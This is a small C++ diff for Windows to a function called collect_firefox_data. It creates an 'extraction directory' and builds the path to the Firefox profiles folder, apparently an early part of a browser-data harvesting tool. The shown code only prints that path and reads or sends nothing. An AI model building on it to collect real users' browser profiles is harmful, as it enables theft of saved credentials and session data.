@@ -96,7 +96,8 @@ void collect_firefox_data() {
 	std::string path_to_extraction_directory = create_extraction_directory();
 	std::string path_to_appdata = get_local_appdata_path();
 	if (path_to_extraction_directory != "" && path_to_appdata != "") {
-		
+		std::string firefox_path = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
+		std::cout << firefox_path << std::endl;
 	}
 }
 
@@ -125,7 +126,7 @@ wchar_t* convert_to_wchar(const char* charArray)
 
 std::string get_local_appdata_path() {
 	wchar_t Folder[1024];
-	HRESULT hr = SHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, 0, Folder);
+	HRESULT hr = SHGetFolderPathW(0, CSIDL_APPDATA, 0, 0, Folder);
 	if (SUCCEEDED(hr)) {
 		char path[1024];
 		wcstombs(path, Folder, 1023);
